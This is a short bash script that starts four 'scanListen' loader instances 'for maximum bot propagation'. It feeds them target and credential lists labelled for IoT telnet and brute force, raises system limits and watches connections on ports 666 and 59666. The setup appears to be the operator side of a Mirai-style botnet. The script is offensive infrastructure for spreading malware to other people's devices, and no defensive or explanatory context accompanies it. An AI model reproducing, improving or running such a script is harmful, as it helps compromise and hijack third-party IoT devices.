#!/bin/bash

# Optimized scanListen startup script
# This script starts multiple scanListen instances for maximum bot propagation

echo "Starting optimized scanListen instances..."

# Kill any existing scanListen processes
pkill -f scanListen

# Set optimal system limits
ulimit -n 999999
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse

# Start multiple scanListen instances with different configurations
echo "Starting scanListen instance 1 (High performance)..."
./scanListen loader1 < big.txt &
SCAN1_PID=$!

echo "Starting scanListen instance 2 (IoT focus)..."
./scanListen loader2 < telnet.txt &
SCAN2_PID=$!

echo "Starting scanListen instance 3 (Brute force)..."
./scanListen loader3 < brute.txt &
SCAN3_PID=$!

echo "Starting scanListen instance 4 (Extended targets)..."
./scanListen loader4 < list.txt &
SCAN4_PID=$!

# Monitor the processes
echo "ScanListen instances started:"
echo "Instance 1 PID: $SCAN1_PID"
echo "Instance 2 PID: $SCAN2_PID" 
echo "Instance 3 PID: $SCAN3_PID"
echo "Instance 4 PID: $SCAN4_PID"

# Keep script running and monitor
while true; do
    sleep 30
    echo "=== ScanListen Status ==="
    ps aux | grep scanListen | grep -v grep
    echo "Active connections:"
    ss -tn | grep -E "(666|59666)" | wc -l
    echo "========================"
done
